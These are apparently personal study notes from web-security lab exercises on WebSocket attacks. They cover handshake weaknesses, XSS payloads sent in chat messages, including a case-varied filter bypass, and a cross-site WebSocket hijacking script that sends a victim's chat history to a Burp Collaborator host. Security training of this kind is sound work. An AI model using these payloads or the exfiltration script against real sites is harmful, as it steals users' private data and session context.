---
layout: default
title: "WebSockets"
parent: "Web Application"
nav_order: 32
---



## Manipulating WebSockets connections
There are various situations in which manipulating the WebSocket handshake might be necessary:
- It can enable you to reach more attack surface.
- Some attacks might cause your connection to drop so you need to establish a new one.
- Tokens or other data in the original handshake request might be stale and need updating.


Suppose a chat application uses WebSockets to send chat messages between the browser and the server. When a user types a chat message, a WebSocket message like the following is sent to the server:
- `{"message":"Hello Carlos"}`
- Then it gets rendered as HTML
- Then you can try: `{"message":"<img src=1 onerror='alert(1)'>"}`


WebSocket handshake vulnerabilities:
- Misplaced trust in HTTP headers to perform security decisions, such as the `X-Forwarded-For` header.
- Flaws in session handling mechanisms, since the session context in which WebSocket messages are processed is generally determined by the session context of the handshake message.
- Attack surface introduced by custom HTTP headers used by the application.

## Cross-Site WebSocket hijacking 
- Relies solely on HTTP cookies for session handling and does not contain any CSRF tokens or other unpredictable values in request parameters
	- This is the first thing to check
	- Note that the `Sec-WebSocket-Key` header contains a random value to prevent errors from caching proxies, and is not used for authentication or session handling purposes.
- Attacker creates a malicious web page on their own domain which establishes a cross-site WebSocket connection to the vulnerable application. The application will handle the connection in the context of the victim user's session with the application.
- Two-way communication, more dangerous that regular CSRF

`<img src=1 oNeRrOr=alert'1'>`
- WHen `<img src=1 onerror=alert'1'>` didn't work

You may be able to reconnect using the `X-Forwarded-For:` Header

## Using Cross-Site WebSockets to exploit other vulnerabilities

```
<script>
    var ws = new WebSocket('wss://0a9400d3031767af80b503260055002a.web-security-academy.net/chat');
    ws.onopen = function() {
        ws.send("READY");
    };
    ws.onmessage = function(event) {
        fetch('https://slh7uxlc3cxuroxh5kv6vp78zz5qtgh5.oastify.com', {method: 'POST', mode: 'no-cors', body: event.data});
    };
</script>
```

- where wss://link is the websocket URL shown in the websocket history
- https://slh7uxlc3cxuroxh5kv6vp78zz5qtgh5.oastify.com is the burp collaborator URL
- Apparently needed to see that the "READY" command retrieves past chat messages from the server in the WebSockets history tab 
	- AND to observe that the request has no CSRF tokens








































